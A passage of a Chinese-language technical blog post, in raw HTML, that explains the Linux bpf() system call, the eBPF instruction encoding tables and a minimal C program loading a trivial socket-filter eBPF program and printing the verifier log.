class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-comment">/* this is overlaid with the target_btf_id above. */</span><br>__u32target_btf_id;<br><span class="hljs-comment">/* black box user-provided value passed through</span><br><span class="hljs-comment"> * to BPF program at the execution time and</span><br><span class="hljs-comment"> * accessible through bpf_get_attach_cookie() BPF helper</span><br><span class="hljs-comment"> */</span><br>__u64cookie;<br>&#125; tracing;<br>&#125;;<br>&#125; link_create;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* struct used by BPF_LINK_UPDATE command */</span><br>__u32link_fd;<span class="hljs-comment">/* link fd */</span><br><span class="hljs-comment">/* new program fd to update link with */</span><br>__u32new_prog_fd;<br>__u32flags;<span class="hljs-comment">/* extra flags */</span><br><span class="hljs-comment">/* expected link&#x27;s program fd; is specified only if</span><br><span class="hljs-comment"> * BPF_F_REPLACE flag is set in flags */</span><br>__u32old_prog_fd;<br>&#125; link_update;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u32link_fd;<br>&#125; link_detach;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* struct used by BPF_ENABLE_STATS command */</span><br>__u32type;<br>&#125; enable_stats;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* struct used by BPF_ITER_CREATE command */</span><br>__u32link_fd;<br>__u32flags;<br>&#125; iter_create;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* struct used by BPF_PROG_BIND_MAP command */</span><br>__u32prog_fd;<br>__u32map_fd;<br>__u32flags;<span class="hljs-comment">/* extra flags */</span><br>&#125; prog_bind_map;<br><br>&#125; __attribute__((aligned(<span class="hljs-number">8</span>)));<br></code></pre></td></tr></table></figure><h2 id="二、-sys-bpf-：bpf-系统调用的核心函数"><a href="#二、-sys-bpf-：bpf-系统调用的核心函数" class="headerlink" title="二、__sys_bpf()：bpf 系统调用的核心函数"></a>二、__sys_bpf()：bpf 系统调用的核心函数</h2><p>bpf 系统调用定义于 <code>kernel/bpf/syscall.c</code> 中，最终调用到 <code>__sys_bpf()</code> ，其核心主要是一个巨大的 switch，根据 cmd 的不同进行不同的操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __sys_bpf(<span class="hljs-type">int</span> cmd, <span class="hljs-type">bpfptr_t</span> uattr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span>;</span><br><span class="hljs-type">bool</span> capable;<br><span class="hljs-type">int</span> err;<br><br>capable = bpf_capable() || !sysctl_unprivileged_bpf_disabled;<br><br><span class="hljs-comment">/* Intent here is for unprivileged_bpf_disabled to block key object</span><br><span class="hljs-comment"> * creation commands for unprivileged users; other actions depend</span><br><span class="hljs-comment"> * of fd availability and access to bpffs, so are dependent on</span><br><span class="hljs-comment"> * object creation success.  Capabilities are later verified for</span><br><span class="hljs-comment"> * operations such as load and map create, so even with unprivileged</span><br><span class="hljs-comment"> * BPF disabled, capability checks are still carried out for these</span><br><span class="hljs-comment"> * and other operations.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!capable &amp;&amp;<br>    (cmd == BPF_MAP_CREATE || cmd == BPF_PROG_LOAD))<br><span class="hljs-keyword">return</span> -EPERM;<br><br>err = bpf_check_uarg_tail_zero(uattr, <span class="hljs-keyword">sizeof</span>(attr), size);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> err;<br>size = <span class="hljs-type">min_t</span>(u32, size, <span class="hljs-keyword">sizeof</span>(attr));<br><br><span class="hljs-comment">/* copy attributes from user space, may be less than sizeof(bpf_attr) */</span><br><span class="hljs-built_in">memset</span>(&amp;attr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(attr));<br><span class="hljs-keyword">if</span> (copy_from_bpfptr(&amp;attr, uattr, size) != <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EFAULT;<br><br>err = security_bpf(cmd, &amp;attr, size);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> BPF_MAP_CREATE:<br>err = map_create(&amp;attr);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">default</span>:<br>err = -EINVAL;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> err;<br>&#125;<br><br>SYSCALL_DEFINE3(bpf, <span class="hljs-type">int</span>, cmd, <span class="hljs-keyword">union</span> bpf_attr __user *, uattr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, size)<br>&#123;<br><span class="hljs-keyword">return</span> __sys_bpf(cmd, USER_BPFPTR(uattr), size);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x03-raw-eBPF-程序编写入门"><a href="#0x03-raw-eBPF-程序编写入门" class="headerlink" title="0x03. raw eBPF 程序编写入门"></a>0x03. raw eBPF 程序编写入门</h1><p>由于 eBPF 相关的各种操作实际上都是通过 <code>bpf()</code> 系统调用完成的，因此我们可以通过直接调用 <code>bpf()</code> 系统调用来感受 eBPF 的魅力：）</p><blockquote><p>注：在 eBPF 的实际应用中很少会直接写 raw BPF 指令，而是会借助诸如 <code>bcc</code> 这样的各类工具，不过那不是这一篇博客的重点：）</p><blockquote><p>有时间的话再在后面的博客中简单讲讲（</p></blockquote></blockquote><blockquote><p>注2：内核在 <code>/samples/bpf</code> 目录下提供了很多帮助我们快速编写 eBPF 程序的工具与一些示例，其中 <code>/samples/bpf/bpf_insn.h</code> 文件<strong>提供了封装好的各类指令模板</strong> ：）</p></blockquote><h2 id="一、eBPF-指令格式"><a href="#一、eBPF-指令格式" class="headerlink" title="一、eBPF 指令格式"></a>一、eBPF 指令格式</h2><p>eBPF 为优雅的 RISC 指令集（<del>这就要说到 Intel CISC 的含屎量了</del>），单条指令长度为 8 字节，定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> &#123;</span><br>__u8code;<span class="hljs-comment">/* 操作码 */</span><br>__u8dst_reg:<span class="hljs-number">4</span>;<span class="hljs-comment">/* 目的寄存器 */</span><br>__u8src_reg:<span class="hljs-number">4</span>;<span class="hljs-comment">/* 源寄存器 */</span><br>__s16off;<span class="hljs-comment">/* 有符号偏移 */</span><br>__s32imm;<span class="hljs-comment">/* 有符号立即数 */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>而 eBPF 实际上有两种编码模式：</p><ul><li>基础编码，单条指令为 64 bit</li><li>宽指令编码， <em>在基础编码后添加一个 64bit 的立即数</em> ，单条指令为 128 bit</li></ul><p>基础编码的指令格式如下：</p><table><thead><tr><th align="center">长度</th><th align="center">8 bits</th><th align="center">4 bits</th><th align="center">4 bits</th><th align="center">16 bits</th><th align="center">32 bits</th></tr></thead><tbody><tr><td align="center">含义</td><td align="center">opcode(操作码)</td><td align="center">dst_reg(目的寄存器)</td><td align="center">src_reg(源寄存器)</td><td align="center">off(有符号偏移)</td><td align="center">imm(有符号32位立即数)</td></tr></tbody></table><p>eBPF 指令中的 <code>opcode</code> 域长度为 8 bit，其中<strong>低 3 位固定表示指令类型</strong>，剩下的高 5 位根据类型不同用途也不同</p><p>指令类型如下表所示： </p><table><thead><tr><th align="center">类型</th><th align="center">值</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">BPF_LD</td><td align="center">0x00</td><td align="center">只能用于宽指令，从 <code>imm64</code> 中加载数据到寄存器</td></tr><tr><td align="center">BPF_LDX</td><td align="center">0x01</td><td align="center">从内存中加载数据到 <code>dst_reg</code></td></tr><tr><td align="center">BPF_ST</td><td align="center">0x02</td><td align="center">把 <code>imm32</code> 数据保存到内存中</td></tr><tr><td align="center">BPF_STX</td><td align="center">0x03</td><td align="center">把 <code>src_reg</code> 寄存器数据保存到内存</td></tr><tr><td align="center">BPF_ALU</td><td align="center">0x04</td><td align="center">32bit 算术运算</td></tr><tr><td align="center">BPF_JMP</td><td align="center">0x05</td><td align="center">64bit 跳转操作</td></tr><tr><td align="center">BPF_JMP32</td><td align="center">0x06</td><td align="center">32bit 跳转操作</td></tr><tr><td align="center">BPF_ALU64</td><td align="center">0x07</td><td align="center">64bit 算术运算</td></tr></tbody></table><blockquote><p>注：在 classic BPF 中 <code>0x06</code> 为函数返回指令 <code>BPF_RET</code> ，<code>0x07</code> 为寄存器交换指令 <code>BPF_MISC</code> （cBPF 只有 <code>A</code> 和 <code>X</code> 两个寄存器）</p></blockquote><p><img src="https://s2.loli.net/2023/05/29/ctkw1sIlfAYp8Hz.png" alt="我超,__！.png"></p><h3 id="算术-amp-跳转指令"><a href="#算术-amp-跳转指令" class="headerlink" title="算术 &amp; 跳转指令"></a>算术 &amp; 跳转指令</h3><p>对于算术 &amp; 跳转指令而言由高位到低位分为三个部分：</p><table><thead><tr><th align="center">4 bit</th><th align="center">1 bit</th><th align="center">3 bit</th></tr></thead><tbody><tr><td align="center">operation code （操作代码）</td><td align="center">source（源）</td><td align="center">instruction class （指令类型）</td></tr></tbody></table><h4 id="①-操作代码"><a href="#①-操作代码" class="headerlink" title="① 操作代码"></a>① 操作代码</h4><p>opcode 的<strong>最高 4 bit 用来保存操作代码</strong>，对于算术指令而言有如下类型：</p><table><thead><tr><th align="center">指令类型</th><th align="center">操作代码</th><th align="center">值</th><th>描述</th></tr></thead><tbody><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_ADD</td><td align="center">0x00</td><td>dst +&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_SUB</td><td align="center">0x10</td><td>dst -&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_MUL</td><td align="center">0x20</td><td>dst *&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_DIV</td><td align="center">0x30</td><td>dst &#x2F;&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_OR</td><td align="center">0x40</td><td>dst |&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_AND</td><td align="center">0x50</td><td>dst &amp;&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_LSH</td><td align="center">0x60</td><td>dst &lt;&lt;&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_RSH</td><td align="center">0x70</td><td>dst &gt;&gt;&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_NEG</td><td align="center">0x80</td><td>dst &#x3D; ~src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_MOD</td><td align="center">0x90</td><td>dst %&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_XOR</td><td align="center">0xA0</td><td>dst ^&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_MOV</td><td align="center">0xB0</td><td>dst &#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_ARSH</td><td align="center">0xC0</td><td>算术右移操作（正数补 0 负数补 1 ）</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_END</td><td align="center">0xD0</td><td>字节序转换</td></tr></tbody></table><p>对于跳转指令而言有如下类型：</p><table><thead><tr><th align="center"><strong>指令类型</strong></th><th align="center"><strong>操作代码</strong></th><th align="center"><strong>值</strong></th><th><strong>描述</strong></th><th>备注</th></tr></thead><tbody><tr><td align="center">BPF_JMP</td><td align="center">BPF_JA</td><td align="center">0x00</td><td>PC +&#x3D; off</td><td>仅用于 BPF_JMP</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JEQ</td><td align="center">0x10</td><td>PC +&#x3D; off if dst &#x3D;&#x3D; src</td><td></td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JGT</td><td align="center">0x20</td><td>PC +&#x3D; off if dst &gt; src</td><td></td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JGE</td><td align="center">0x30</td><td>PC +&#x3D; off if dst &gt;&#x3D; src</td><td></td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JSET</td><td align="center">0x40</td><td>PC +&#x3D; off if dst &amp; src</td><td></td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JNE</td><td align="center">0x50</td><td>PC +&#x3D; off if dst !&#x3D; src</td><td>仅 eBPF：不等时跳转</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JSGT</td><td align="center">0x60</td><td>PC +&#x3D; off if dst &gt; src</td><td>仅 eBPF：有符号 ‘&gt;’</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JSGE</td><td align="center">0x70</td><td>PC +&#x3D; off if dst &gt;&#x3D; src</td><td>仅 eBPF：有符号 ‘&gt;&#x3D;’</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_CALL</td><td align="center">0x80</td><td>函数调用</td><td>仅 eBPF：函数调用</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_EXIT</td><td align="center">0x90</td><td>函数或者程序返回</td><td>仅 eBPF：函数返回</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JLT</td><td align="center">0xA0</td><td>PC +&#x3D; off if dst &lt; src</td><td>仅 eBPF：无符号 ‘&lt;’</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JLE</td><td align="center">0xB0</td><td>PC +&#x3D; off if dst &lt;&#x3D; src</td><td>仅 eBPF：无符号 ‘&lt;&#x3D;’</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JSLT</td><td align="center">0xC0</td><td>PC +&#x3D; off if dst &lt; src</td><td>仅 eBPF：有符号 ‘&lt;’</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JSLE</td><td align="center">0xD0</td><td>PC +&#x3D; off if dst &lt;&#x3D; src</td><td>仅 eBPF：有符号 ‘&lt;&#x3D;’</td></tr></tbody></table><h4 id="②-源"><a href="#②-源" class="headerlink" title="② 源"></a>② 源</h4><p>opcode 中间的一个 bit 用来表示 <strong>源</strong> ，对于普通的跳转与算术指令而言含义如下表：</p><table><thead><tr><th align="center">指令类型</th><th align="center">源</th><th align="center">值</th><th>描述</th></tr></thead><tbody><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64 &#x2F; BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_K</td><td align="center">0x00</td><td>使用32-bit <code>imm32</code> 作为源操作数</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64 &#x2F; BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_X</td><td align="center">0x08</td><td>使用源寄存器 （<code>src_reg</code>） 作为源操作数</td></tr></tbody></table><p>对于 <code>BPF_END</code> 操作码而言含义如下：</p><table><thead><tr><th align="center">指令类型</th><th align="center">操作代码</th><th align="center">源</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_END</td><td align="center">BPF_TO_LE</td><td>0x00</td><td>转为小端序</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_END</td><td align="center">BPF_TO_BE</td><td>0x08</td><td>转为大端序</td></tr></tbody></table><h3 id="Load-amp-Store-指令"><a href="#Load-amp-Store-指令" class="headerlink" title="Load &amp; Store 指令"></a>Load &amp; Store 指令</h3><p>对于 Load &amp; Store 指令而言，opcode 由高到低分为如下三部分：</p><table><thead><tr><th align="center">3 bits</th><th align="center">2 bit</th><th align="center">3 bits</th></tr></thead><tbody><tr><td align="center">mode（模式）</td><td align="center">size（大小）</td><td align="center">instruction class （指令类型）</td></tr></tbody></table><h4 id="①-大小"><a href="#①-大小" class="headerlink" title="① 大小"></a>① 大小</h4><p> Load &amp; Store 指令的 <strong>size</strong> 域用来表示<strong>操作的字节数</strong>：</p><blockquote><p>不知道为啥排序设为 4 2 1 8 :（</p></blockquote><table><thead><tr><th align="center">大小</th><th align="center">值</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">BPF_W</td><td align="center">0x00</td><td align="center">单字（4 字节）</td></tr><tr><td align="center">BPF_H</td><td align="center">0x08</td><td align="center">半字（2字节）</td></tr><tr><td align="center">BPF_B</td><td align="center">0x10</td><td align="center">单字节（1字节）</td></tr><tr><td align="center">BPF_DW</td><td align="center">0x18</td><td align="center">双字（8字节）</td></tr></tbody></table><h4 id="②-模式"><a href="#②-模式" class="headerlink" title="② 模式"></a>② 模式</h4><p> Load &amp; Store 指令的 <strong>mode</strong> 域用来表示<strong>操作的模式</strong>，也就是如何去操作指定大小的数据：</p><table><thead><tr><th align="center">模式</th><th align="center">值</th><th align="center">描述</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center">BPF_IMM</td><td align="center">0x00</td><td align="center">64 位立即数</td><td align="center">eBPF 为64 位立即数，cBPF 中为 32 位</td></tr><tr><td align="center">BPF_ABS</td><td align="center">0x20</td><td align="center">数据包直接访问</td><td align="center">兼容自 cBPF 指令。R6 作为隐式输入，存放 <code>struct *sk_buff</code> ；R0 作为隐式输出，存放包中读出数据；R1 ~ R5 作为 scratch registers，在每次调用后会被清空</td></tr><tr><td align="center">BPF_IND</td><td align="center">0x40</td><td align="center">数据包间接访问</td><td align="center">同 BPF_ABS</td></tr><tr><td align="center">BPF_MEM</td><td align="center">0x60</td><td align="center">赋值给 *(size *)(dst_reg + off)</td><td align="center">标准 load &amp; store 操作</td></tr><tr><td align="center">BPF_LEN</td><td align="center">0x80</td><td align="center">保留指令</td><td align="center">仅用于 cBPF</td></tr><tr><td align="center">BPF_MSH</td><td align="center">0xA0</td><td align="center">保留指令</td><td align="center">仅用于 cBPF</td></tr><tr><td align="center">BPF_XADD</td><td align="center">0xC0</td><td align="center">原子操作，*(无符号类型 *)(dst_reg + off16) 运算&#x3D; src_reg</td><td align="center">仅用于 eBPF，不支持 1 &#x2F; 2 字节曹祖</td></tr></tbody></table><p>对于 <code>BPF_XADD</code>， <code>imm32</code> 域被用来表示原子操作的运算类型：</p><table><thead><tr><th align="center">imm32</th><th align="center">值</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">BPF_ADD</td><td align="center">0x00</td><td align="center">原子加</td></tr><tr><td align="center">BPF_OR</td><td align="center">0x40</td><td align="center">原子或</td></tr><tr><td align="center">BPF_AND</td><td align="center">0x50</td><td align="center">原子与</td></tr><tr><td align="center">BPF_XOR</td><td align="center">0xa0</td><td align="center">原子异或</td></tr></tbody></table><blockquote><p><del>反正👴看得是有点头大的</del></p></blockquote><h2 id="二、raw-eBPF-程序编写"><a href="#二、raw-eBPF-程序编写" class="headerlink" title="二、raw eBPF 程序编写"></a>二、raw eBPF 程序编写</h2><p>一个最简单的 eBPF 程序<strong>便是一个</strong> <code>bpf_insn</code> <strong>结构体数组</strong>，我们可以直接在用户态下编写一个 <code>bpf_insn</code> 结构体数组并直接调用 <code>bpf()</code> 系统调用完成 eBPF 程序的创建与挂载：）</p><p>最简单的方法便是直接按如下形式定义一条基本的 eBPF 指令：</p><blockquote><p> 注：这里可以直接使用内核源码目录下提供的 <code>/samples/bpf/bpf_insn.h</code> ：）</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)        \</span><br><span class="hljs-meta">    ((struct bpf_insn) &#123;                              \</span><br><span class="hljs-meta">        .code         = CODE,                         \</span><br><span class="hljs-meta">        .dst_reg     = DST,                           \</span><br><span class="hljs-meta">        .src_reg     = SRC,                           \</span><br><span class="hljs-meta">        .off         = OFF,                           \</span><br><span class="hljs-meta">        .imm         = IMM                            \</span><br><span class="hljs-meta">&#125;)</span><br></code></pre></td></tr></table></figure><p>之后直接开写就行，需要注意的是我们应当以一条 <code>跳转结束指令</code> （opcode 为 <code>BPF_JMP | BPF_EXIT</code> ）作为结尾，下面是一个🌰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/bpf.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)          \</span><br><span class="hljs-meta">    ((struct bpf_insn) &#123;                                \</span><br><span class="hljs-meta">        .code        = CODE,                            \</span><br><span class="hljs-meta">        .dst_reg     = DST,                             \</span><br><span class="hljs-meta">        .src_reg     = SRC,                             \</span><br><span class="hljs-meta">        .off         = OFF,                             \</span><br><span class="hljs-meta">        .imm         = IMM                              \</span><br><span class="hljs-meta">&#125;)</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">test_bpf_prog</span>[] =</span> &#123;<br>    BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x114514</span>),<br>    BPF_RAW_INSN(BPF_JMP | BPF_EXIT, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TEST_BPF_LOG_SZ 0x10000</span><br><span class="hljs-type">char</span> test_bpf_log_buf[TEST_BPF_LOG_SZ] = &#123; <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">test_bpf_attr</span> =</span> &#123;<br>    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,<br>    .insns = (<span class="hljs-type">uint64_t</span>) &amp;test_bpf_prog,<br>    .insn_cnt = <span class="hljs-keyword">sizeof</span>(test_bpf_prog) / <span class="hljs-keyword">sizeof</span>(test_bpf_prog[<span class="hljs-number">0</span>]),<br>    .license = (<span class="hljs-type">uint64_t</span>) <span class="hljs-string">&quot;GPL&quot;</span>,<br>    .log_level = <span class="hljs-number">2</span>,<br>    .log_buf = (<span class="hljs-type">uint64_t</span>) test_bpf_log_buf,<br>    .log_size = TEST_BPF_LOG_SZ,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bpf</span><span class="hljs-params">(<span class="hljs-type">int</span> cmd, <span class="hljs-keyword">union</span> bpf_attr *attr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_bpf, cmd, attr, <span class="hljs-keyword">sizeof</span>(*attr));<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> test_bpf_prog_fd;<br>    <span class="hljs-type">char</span> *err_msg;<br><br>    <span class="hljs-comment">/* load bpf prog into kernel */</span><br>    test_bpf_prog_fd = bpf(BPF_PROG_LOAD, &amp;test_bpf_attr);<br>    <span class="hljs-keyword">if</span> (test_bpf_prog_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_msg = <span class="hljs-string">&quot;FAILED to load bpf program!&quot;</span>;<br>        <span class="hljs-keyword">goto</span> err_bpf_load;<br>    &#125;<br><br>    <span class="hljs-comment">/* output the log */</span><br>    <span class="hljs-built_in">puts</span>(test_bpf_log_buf);<br><br>    close(test_bpf_prog_fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err_bpf_load:<br>    <span class="hljs-built_in">puts</span>(test_bpf_log_buf);<br>err_socket:<br>    err_exit(err_msg);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>内核会将相关的运行日志写入到我们所指定的缓冲区当中，这里输出日志缓冲区可以看到内核成功地解析了我们的 eBPF 程序：</p><p><img src="https://s2.loli.net/2023/05/31/6wJAz7CSFG91DmQ.png" alt="image.png"></p><h2 